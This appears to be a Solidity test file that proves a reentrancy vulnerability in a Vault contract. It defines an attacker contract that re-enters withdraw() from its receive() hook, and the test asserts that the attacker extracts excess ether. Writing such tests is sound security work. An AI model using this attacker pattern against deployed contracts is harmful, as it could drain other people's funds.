// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "../../src/Vault.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
}

contract VaultReentrancyAttacker {
    Vault internal target;
    uint256 public reentryCount;

    constructor(Vault _target) {
        target = _target;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (reentryCount == 0) {
            reentryCount = 1;
            target.withdraw();
        }
    }
}

contract VaultreentrancyTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_reentrancy_proof_scaffold() public {
        Vault target = new Vault();
        VaultReentrancyAttacker attacker = new VaultReentrancyAttacker(target);
        vm.deal(address(this), 1 ether);
        vm.deal(address(target), 2 ether);
        attacker.attack{value: 1 ether}();
        require(attacker.reentryCount() == 1, "reentrant callback was not observed");
        require(address(attacker).balance > 1 ether, "attacker did not extract excess value");
    }
}
